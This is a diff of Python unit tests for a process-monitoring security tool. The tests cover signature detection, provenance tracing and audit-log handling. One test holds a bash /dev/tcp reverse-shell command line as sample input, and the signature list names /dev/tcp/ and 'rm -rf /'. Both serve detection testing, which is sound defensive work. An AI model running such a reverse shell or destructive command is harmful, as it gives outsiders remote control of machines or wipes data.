@@ -101,6 +101,24 @@ class TestDetection(unittest.TestCase):
     def test_signature_scan_clean(self):
         self.assertIsNone(signature_scan(PROC_SAFE, ["rm -rf /"]))
 
+    def test_dev_tcp_reverse_shell_matches_at_high_risk(self):
+        """The /dev/tcp/ signature catches `bash -i >& /dev/tcp/...` reverse
+        shells as a signature-based detection at high base risk."""
+        proc = AgentProcess(1, "bash", "bash -i >& /dev/tcp/10.0.0.2/4444 0>&1")
+        det = signature_scan(proc, load_signatures())
+        self.assertIsNotNone(det)
+        self.assertEqual(det.algorithm, "signature_based")
+        self.assertEqual(det.base_risk, "high")
+        self.assertEqual(det.matched, "/dev/tcp/")
+
+    def test_dev_tcp_signature_no_false_positive_on_benign_cmdlines(self):
+        """Benign processes — including one that merely references a docs path
+        about /dev/tcp — must NOT match the reverse-shell signature."""
+        benign = AgentProcess(2, "agent", "python3 agent.py --serve")
+        self.assertIsNone(signature_scan(benign, load_signatures()))
+        reader = AgentProcess(3, "less", "less /usr/share/doc/bash/README.dev-tcp.txt")
+        self.assertIsNone(signature_scan(reader, ["/dev/tcp/"]))
+
     def test_anomaly_flags_long_cmdline(self):
         proc = AgentProcess(1, "a", "agent " + " ".join(f"--x{i}" for i in range(60)))
         self.assertIsNotNone(anomaly_scan(proc))
@@ -392,8 +410,29 @@ class TestSignaturesDB(unittest.TestCase):
         sigs = load_signatures(Path("/nonexistent.json"))
         self.assertIn("rm -rf /", sigs)
 
+    def test_shipped_db_contains_reverse_shell_signature_and_defaults(self):
+        """The repo-root signature DB ships /dev/tcp/ and keeps the built-in
+        defaults (a present file replaces the defaults, never merges)."""
+        sigs = load_signatures(Path("threat_signatures.json"))
+        self.assertIn("/dev/tcp/", sigs)
+        self.assertIn("rm -rf /", sigs)
+
 
 class TestTraceProvenance(unittest.TestCase):
+    def setUp(self):
+        # trace_provenance() audits every capability gap; keep those entries
+        # out of the repo-root guardian_audit.log.
+        self.tmp = tempfile.TemporaryDirectory()
+        self.log = Path(self.tmp.name) / "audit.log"
+        # Redirect the trail class-wide so the pre-existing tests (which do not
+        # patch AUDIT_LOG_PATH themselves) never write to the repo-root log.
+        self._audit = patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log)
+        self._audit.start()
+
+    def tearDown(self):
+        self._audit.stop()
+        self.tmp.cleanup()
+
     def test_walks_ancestor_chain_to_origin(self):
         """Provenance traces the exact parent chain to where the threat came from."""
         with patch("guardian.os.readlink", side_effect=OSError("gone")), \
@@ -421,6 +460,88 @@ class TestTraceProvenance(unittest.TestCase):
         self.assertEqual(prov["ancestors"], [])
         run.assert_not_called()
 
+    def test_degraded_reads_return_partial_provenance_and_audit_gaps(self):
+        """Graceful degradation: /proc readlink failures yield partial
+        provenance (identity fields still present), never raise, and the gaps
+        are disclosed in the audit trail — never a silent failure."""
+        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
+             patch("guardian.os.readlink", side_effect=OSError("gone")), \
+             patch("guardian.subprocess.run") as run:
+            run.return_value = type("R", (), {"stdout": "1 init /sbin/init\n"})()
+            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1001))
+        self.assertEqual(prov["exe"], "")
+        self.assertEqual(prov["cwd"], "")
+        self.assertEqual(prov["ancestors"],
+                         [{"pid": 1001, "name": "init", "cmdline": "/sbin/init"}])
+        entries = [e for e in read_audit_trail(self.log, action_type="protection")
+                   if "Partial provenance" in e["description"]]
+        self.assertEqual(len(entries), 1)
+        self.assertEqual(entries[0]["agent_id"], "4321")
+        self.assertTrue(any("exe" in g for g in entries[0]["details"]["unavailable"]))
+        self.assertTrue(any("cwd" in g for g in entries[0]["details"]["unavailable"]))
+        self.assertIn("unavailable", prov)
+
+    def test_ps_failure_mid_walk_keeps_partial_ancestors_and_audits(self):
+        """A ps failure mid-walk stops the trace but keeps the ancestors
+        already traced, and the truncation is audited."""
+        import subprocess as sp
+        calls = []
+
+        def fake_run(*a, **kw):
+            calls.append(a)
+            if len(calls) == 1:
+                return type("R", (), {"stdout": "1000 sshd 'sshd: session'\n"})()
+            raise sp.SubprocessError("ps blew up")
+
+        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
+             patch("guardian.os.readlink", side_effect=OSError("gone")), \
+             patch("guardian.subprocess.run", side_effect=fake_run):
+            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1001))
+        self.assertEqual(prov["ancestors"],
+                         [{"pid": 1001, "name": "sshd", "cmdline": "sshd: session"}])
+        entries = [e for e in read_audit_trail(self.log, action_type="protection")
+                   if "Partial provenance" in e["description"]]
+        self.assertEqual(len(entries), 1)
+        self.assertTrue(any("ancestor walk" in g
+                            for g in entries[0]["details"]["unavailable"]))
+        self.assertEqual(entries[0]["details"]["ancestors_traced"], 1)
+
+    def test_no_proc_platform_degrades_gracefully_and_audits(self):
+        """Platforms without /proc (ps absent): exe/cwd are empty, no ancestor
+        walk is attempted, nothing raises, and every gap is audited."""
+        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
+             patch("guardian.have_command", return_value=False), \
+             patch("guardian.subprocess.run") as run:
+            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1001))
+        self.assertEqual(prov["exe"], "")
+        self.assertEqual(prov["cwd"], "")
+        self.assertEqual(prov["ancestors"], [])
+        run.assert_not_called()  # no ps on this platform: no walk attempted
+        entries = [e for e in read_audit_trail(self.log, action_type="protection")
+                   if "Partial provenance" in e["description"]]
+        self.assertEqual(len(entries), 1)
+        unavailable = entries[0]["details"]["unavailable"]
+        self.assertTrue(any("no /proc" in g for g in unavailable))
+        self.assertTrue(any("ancestor walk" in g for g in unavailable))
+
+    def test_full_trace_logs_no_degradation_entry(self):
+        """Clean path: when every read succeeds there is nothing to disclose,
+        so no partial-provenance entry is written."""
+        def readlink(path):
+            return {f"/proc/4321/exe": "/usr/bin/agent",
+                    f"/proc/4321/cwd": "/srv/agent"}[path]
+
+        with patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log), \
+             patch("guardian.os.readlink", side_effect=readlink), \
+             patch("guardian.subprocess.run") as run:
+            run.return_value = type("R", (), {"stdout": "1 init /sbin/init\n"})()
+            prov = trace_provenance(AgentProcess(4321, "agent", "agent evil", ppid=1001))
+        self.assertEqual(prov["exe"], "/usr/bin/agent")
+        self.assertEqual(prov["cwd"], "/srv/agent")
+        self.assertEqual(len(prov["ancestors"]), 1)
+        self.assertNotIn("unavailable", prov)
+        self.assertEqual(read_audit_trail(self.log), [])
+
 
 class TestQuarantineThreat(unittest.TestCase):
     def setUp(self):
@@ -430,9 +551,14 @@ class TestQuarantineThreat(unittest.TestCase):
         self.old_cwd = os.getcwd()
         os.chdir(self.dir)
         self.log = self.dir / "audit.log"
+        # quarantine_threat() calls the real trace_provenance(), which audits
+        # capability gaps (/proc reads); redirect the trail into tmp_path.
+        self._audit = patch.object(guardian_audit, "AUDIT_LOG_PATH", self.log)
+        self._audit.start()
 
     def tearDown(self):
         import os
+        self._audit.stop()
         os.chdir(self.old_cwd)
         self.tmp.cleanup()
 
@@ -707,7 +833,9 @@ class TestTraceIntrusionOrigin(unittest.TestCase):
                          Detection("intrusion_detection", "desc", "m", "critical"),
                          "bash", 777)
         stat = "777 (bash) S 100 777 777 0 -1 4194304 100 0 0 0 0 0 0 0"
-        with patch("guardian.Path.read_text", return_value=stat), \
+        with tempfile.TemporaryDirectory() as d, \
+             patch.object(guardian_audit, "AUDIT_LOG_PATH", Path(d) / "audit.log"), \
+             patch("guardian.Path.read_text", return_value=stat), \
              patch("guardian.os.readlink", side_effect=OSError("gone")), \
              patch("guardian.subprocess.run") as run:
             run.return_value = type("R", (), {"stdout": "1 sshd 'sshd: session'\n"})()
@@ -722,7 +850,9 @@ class TestTraceIntrusionOrigin(unittest.TestCase):
                          Detection("intrusion_detection", "desc", "m", "high"),
                          "tcpdump", 9100)
         stat = "9100 (tcpdump) S 1 9100 9100 0 -1 4194304 100 0 0 0 0 0 0 0"
-        with patch("guardian.Path.read_text", return_value=stat), \
+        with tempfile.TemporaryDirectory() as d, \
+             patch.object(guardian_audit, "AUDIT_LOG_PATH", Path(d) / "audit.log"), \
+             patch("guardian.Path.read_text", return_value=stat), \
              patch("guardian.os.readlink", side_effect=OSError("gone")), \
              patch("guardian.subprocess.run") as run:
             origin = trace_intrusion_origin(intr)
